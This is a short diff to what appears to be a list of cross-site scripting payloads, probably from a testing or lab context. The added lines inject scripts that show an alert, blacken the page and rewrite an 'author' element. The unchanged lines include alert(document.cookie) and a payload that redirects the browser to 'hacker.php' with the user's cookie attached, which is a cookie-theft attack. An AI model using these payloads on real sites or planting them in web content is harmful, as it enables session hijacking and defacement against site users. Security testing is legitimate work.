@@ -1,3 +1,8 @@
+
+<script>alert("Hello")</script>
+<script>document.body.style.background="#000"</script>
+<script>var x = document.getElementsByClassName("author")[0]; x.innerHTML = "Mlem Mlem...";</script>
+
 <script>alert(document.cookie)</script>
 
 <script>window.location.assign("hacker.php?cookie="%2bdocument.cookie);</script>
